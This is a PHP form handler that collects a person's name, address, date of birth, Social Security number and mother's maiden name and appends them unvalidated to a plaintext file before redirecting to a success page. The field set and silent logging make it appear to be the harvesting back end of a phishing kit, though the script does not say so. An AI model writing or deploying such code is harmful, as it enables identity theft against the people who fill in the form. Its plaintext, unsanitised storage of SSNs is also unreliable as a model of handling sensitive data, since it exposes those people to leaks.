<?php

if (isset($_POST['name'])) {
    // Retrieve the city from the $_POST array
    $name = $_POST['name'];

    // Optionally, you can process or save the city as needed
}

if (isset($_POST['primary'])) {
    // Retrieve the city from the $_POST array
    $primary = $_POST['primary'];

    // Optionally, you can process or save the city as needed
}
if (isset($_POST['zipCode'])) {
    // Retrieve the city from the $_POST array
    $zipCode = $_POST['zipCode'];

    // Optionally, you can process or save the city as needed
}

if (isset($_POST['city'])) {
    // Retrieve the city from the $_POST array
    $city = $_POST['city'];

    // Optionally, you can process or save the city as needed
}

// Add more conditions for additional input targets
if (isset($_POST['state'])) {
    $state = $_POST['state'];
    // Optionally, process or save input_target_1 as needed
}

if (isset($_POST['dob'])) {
    $dob = $_POST['dob'];
    // Optionally, process or save input_target_2 as needed
}

if (isset($_POST['ssn'])) {
    $ssn = $_POST['ssn'];
    // Optionally, process or save input_target_2 as needed
}

if (isset($_POST['maidenName'])) {
    $maidenName = $_POST['maidenName'];
    // Optionally, process or save input_target_2 as needed
}

// Repeat the above block for additional input targets (input_target_3, input_target_4, etc.)

// Combine all input data into an array
$inputData = array(
    'name' => $name,
    'primary' => $primary,
    'city' => $city,
    'state' => $state,
    'zipCode' => $zipCode,
    'dob' => $dob,
    'ssn' => $ssn,
    'maidenName' => $maidenName
    // Add more keys for additional input targets
);

// Save all input data to the same file
saveDataToFile($inputData);

// Optionally, you can redirect the user or display a success message here
header("Location: success.php");
exit;

function saveDataToFile($data) {
    // Open a file (you may want to use a database or other storage method)
    $file = fopen("data.txt", "a");

    // Convert the data array to a JSON string for easy storage and retrieval
    $jsonData = json_encode($data);

    // Write the JSON string to the file
    fwrite($file, $jsonData . "\n");

    // Close the file
    fclose($file);
}
?>

